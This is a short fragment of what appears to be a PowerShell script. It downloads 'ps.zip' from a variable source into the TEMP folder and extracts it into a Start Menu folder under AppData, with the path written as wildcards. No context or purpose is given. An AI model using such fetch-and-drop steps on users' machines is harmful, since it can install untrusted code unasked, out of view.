$_F = "ps.zip"

wget "$src/$_F" "$env:TEMP\$_F"

ez "$env:temp\$_F" "$env:appdata\M*\W*\S*\P*\W*Shell\"
